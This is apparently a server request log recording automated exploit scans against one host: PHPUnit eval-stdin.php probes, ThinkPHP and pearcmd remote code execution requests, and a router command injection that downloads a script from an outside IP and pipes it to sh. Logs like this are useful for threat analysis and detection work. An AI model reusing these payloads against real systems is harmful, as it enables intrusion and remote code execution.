+2024-09-11 08:37:00 info: to ==> https://146.56.112.234:80/lib/phpunit/phpunit/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:02 info: to ==> https://146.56.112.234:80/lib/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:05 info: to ==> https://146.56.112.234:80/lib/phpunit/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:07 info: to ==> https://146.56.112.234:80/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:10 info: to ==> https://146.56.112.234:80/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:13 info: to ==> https://146.56.112.234:80/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:15 info: to ==> https://146.56.112.234:80/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:18 info: to ==> https://146.56.112.234:80/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:20 info: to ==> https://146.56.112.234:80/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:23 info: to ==> https://146.56.112.234:80/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:26 info: to ==> https://146.56.112.234:80/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:28 info: to ==> https://146.56.112.234:80/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:31 info: to ==> https://146.56.112.234:80/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:33 info: to ==> https://146.56.112.234:80/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:36 info: to ==> https://146.56.112.234:80/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:39 info: to ==> https://146.56.112.234:80/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:42 info: to ==> https://146.56.112.234:80/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:44 info: to ==> https://146.56.112.234:80/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:47 info: to ==> https://146.56.112.234:80/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:49 info: to ==> https://146.56.112.234:80/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:52 info: to ==> https://146.56.112.234:80/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:54 info: to ==> https://146.56.112.234:80/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:57 info: to ==> https://146.56.112.234:80/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:37:59 info: to ==> https://146.56.112.234:80/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:38:02 info: to ==> https://146.56.112.234:80/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:38:05 info: to ==> https://146.56.112.234:80/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
+2024-09-11 08:38:07 info: to ==> https://146.56.112.234:80/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello 
+2024-09-11 08:38:10 info: to ==> https://146.56.112.234:80/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello 
+2024-09-11 08:38:13 info: to ==> https://146.56.112.234:80/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php 
+2024-09-11 08:38:15 info: to ==> https://146.56.112.234:80/index.php?lang=../../../../../../../../tmp/index1 
+2024-09-11 08:50:48 info: to ==> https://146.56.112.234/ 
+2024-09-11 08:54:22 info: to ==> https://146.56.112.234:80/actuator/gateway/routes 
+2024-09-11 09:10:43 info: to ==> https://speed.cloudflare.com/cdn-cgi/trace 
+2024-09-11 09:13:02 info: to ==> https://146.56.112.234:80/geoserver 
+2024-09-11 09:20:47 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) 
+2024-09-11 09:27:36 info: to ==> https://localhost/ 
+2024-09-11 09:41:12 info: to ==> https://146.56.112.234:80/cgi-bin/luci/;stok=/locale 
+2024-09-11 10:11:41 info: to ==> https://146.56.112.234:80/ 
